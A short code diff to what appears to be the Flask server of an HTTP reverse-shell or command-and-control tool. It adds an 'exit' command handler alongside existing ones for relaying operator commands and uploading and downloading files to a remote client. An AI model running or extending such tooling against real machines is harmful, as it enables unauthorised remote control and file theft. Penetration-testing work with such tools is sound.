@@ -64,6 +64,7 @@ clientIP = ""
 emptyresponse = ('', 204)
 upload_contents, cmd_contents = "", ""
 
+exit_cmd  = re.compile(r'^exit\s*')
 clear_cmd = re.compile(r'^clear\s*')
 unix_path = re.compile(r'^download ((.+/)*([^/]+))$')
 unix_upld = re.compile(r'^upload (.+/)*([^/]+)$')
@@ -207,8 +208,12 @@ def valid_file(file):
 
 @app.route('/')
 def handleGET():
-    global upload_contents, cmd_contents
+    global upload_contents, cmd_contents, waiting
     try:
+        if waiting == True:
+            waiting = False
+            time.sleep(.1)
+            ret(.1)
         prompt = craft_prompt(request.headers, request.remote_addr)
         cmd = input(prompt)
         if cmd:
@@ -245,6 +250,13 @@ def handleGET():
             elif clear_cmd.match(cmd):
                 os.system('cls') if os.name == 'nt' else os.system('clear')
                 return emptyresponse
+            elif exit_cmd.match(cmd):
+                cmd_contents = cmd
+                waiting = True
+                t = Thread(target=loading)
+                t.daemon = True
+                t.start()
+                return redirect(url_for('commander'))
             else:
                 cmd_contents = cmd
                 return redirect(url_for('commander'))
